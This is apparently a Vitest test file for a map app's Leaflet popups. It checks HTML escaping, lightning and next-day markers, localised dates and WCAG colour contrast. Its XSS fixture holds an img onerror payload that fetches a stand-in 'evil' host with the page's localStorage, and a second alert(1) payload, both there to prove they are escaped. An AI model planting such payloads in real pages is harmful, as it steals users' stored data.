import { describe, it, expect, beforeEach } from 'vitest'
import popupSource from './mapPopups.ts?raw'
import { lang, langReady, setLang } from './i18n'
import { officialSpotPopup, ownSpotPopup, savedSpotPopup } from './mapPopups'
import { STRINGS } from '@/test/strings'
import type { Location, ScoredWindow } from './types'

/**
 * Every Leaflet popup in MapTab and MapView is built here, and Leaflet writes a
 * string popup with innerHTML. So these are the sinks: each must turn markup in
 * a location name (or window time) into inert text.
 */
const XSS = 'Køge Havn<img src=x onerror=fetch(\'//evil/?\'+btoa(JSON.stringify(localStorage)))>'

/** Tag names the string would create if handed to innerHTML. */
const tagsIn = (s: string) => [...s.matchAll(/<\s*([a-z][a-z0-9]*)/gi)].map((m) => m[1].toLowerCase())
const ALLOWED = new Set(['strong', 'br', 'span'])

function expectInert(out: string) {
  expect(tagsIn(out).filter((tag) => !ALLOWED.has(tag))).toEqual([])
  expect(out).not.toMatch(/<img/i)
  expect(out).toContain('&lt;img src=x onerror=')
}

const loc = (name: string): Location => ({ id: 'a', name, lat: 55.45, lon: 12.19 })
const win = (l: Location, extra: Partial<ScoredWindow> = {}): ScoredWindow => ({
  location: l, date: new Date(Date.UTC(2026, 5, 15)), from: '06:00', to: '09:00',
  score: 72, noData: false, bestHourStr: null, tags: [], ...extra,
})

describe('map popups', () => {
  beforeEach(() => { lang.value = 'da' })

  it('dashboard map: own spot name is escaped, with and without a score', () => {
    const l = loc(XSS)
    expectInert(ownSpotPopup(l, win(l)))
    expectInert(ownSpotPopup(l, undefined))
  })

  it('dashboard map: window times from a shared link are escaped', () => {
    const l = loc('Molen')
    const out = ownSpotPopup(l, win(l, { from: '06:00<img src=x onerror=alert(1)>', to: '09:00' }))
    expect(tagsIn(out).filter((tag) => !ALLOWED.has(tag))).toEqual([])
  })

  it('dashboard map: official spot name is escaped', () => {
    expectInert(officialSpotPopup(win(loc(XSS)), 4))
    expectInert(officialSpotPopup(win(loc(XSS)), undefined))
  })

  it('setup map: saved spot name is escaped, with and without a score', () => {
    expectInert(savedSpotPopup(loc(XSS), 55))
    expectInert(savedSpotPopup(loc(XSS), undefined))
  })

  it("says why a pin is capped: today's lightning reading is shown", () => {
    const l = loc('Molen')
    const storm = win(l, { score: 15, lightning: { level: 'danger', closestKm: null } })
    expect(officialSpotPopup(storm, 8)).toContain('⚡')
    expect(ownSpotPopup(l, storm)).toContain('⚡')
    expect(officialSpotPopup(win(l), 8)).not.toContain('⚡')
  })

  it('still renders the ordinary content', () => {
    const l = loc('Sydmolen')
    const out = ownSpotPopup(l, win(l))
    expect(out).toContain('<strong>📍 Sydmolen</strong>')
    expect(out).toContain('72 · ')
    expect(out).toContain('06:00–09:00')
    expect(out).toContain('15.') // the window's date
  })

  // Round L: the dashboard gives no "+1" to a window that ends at midnight,
  // the end of its own evening (lib/availabilityCheck endsNextDay). The
  // map's popup still wrote "22:00–00:00 (+1)", so the two disagreed.
  it('marks "(+1)" on a window ending the next day, not on one ending at midnight', () => {
    const l = loc('Sydmolen')
    expect(ownSpotPopup(l, win(l, { from: '22:00', to: '00:00' }))).toContain('22:00–00:00</span>')
    expect(ownSpotPopup(l, win(l, { from: '22:00', to: '02:00' }))).toContain('22:00–02:00 (+1)</span>')
    expect(ownSpotPopup(l, win(l, { from: '06:00', to: '09:00' }))).toContain('06:00–09:00</span>')
  })

  it("writes the window's date as the language shown does: \"Man 15.\", \"Mon 15\"", async () => {
    const l = loc('Sydmolen')
    expect(ownSpotPopup(l, win(l))).toContain(`${STRINGS.da.day1} 15. · 06:00–09:00`)
    setLang('en')
    try {
      expect(await langReady()).toBe(true) // the English table is a chunk of its own
      expect(ownSpotPopup(l, win(l))).toContain(`${STRINGS.en.day1} 15 · 06:00–09:00`)
    } finally {
      setLang('da')
    }
  })
})

/**
 * The popups sit on Leaflet's white popup, and their small text took the app's
 * dark-theme colours: the active species in pale green (#bbf7d0, about 1.2:1
 * on white, near invisible in the round F browser check), the muted lines in
 * #7d93ad (3.2:1) and the lightning line in #ef4444 (3.8:1). Small text needs
 * 4.5:1 (WCAG AA).
 */
describe("popup text on Leaflet's white popup", () => {
  const luminance = (hex: string) => {
    const [r, g, b] = [1, 3, 5].map((i) => parseInt(hex.slice(i, i + 2), 16) / 255)
      .map((c) => (c <= 0.03928 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4))
    return 0.2126 * r + 0.7152 * g + 0.0722 * b
  }
  const onWhite = (hex: string) => 1.05 / (luminance(hex) + 0.05)

  it('every text colour has at least 4.5:1 contrast', () => {
    const colours = [...popupSource.matchAll(/(?:^|[;"'\s])color:\s*(#[0-9a-fA-F]{6})/g)].map((m) => m[1])
    expect(colours.length).toBeGreaterThanOrEqual(3)
    for (const c of colours) expect(onWhite(c), c).toBeGreaterThanOrEqual(4.5)
  })
})
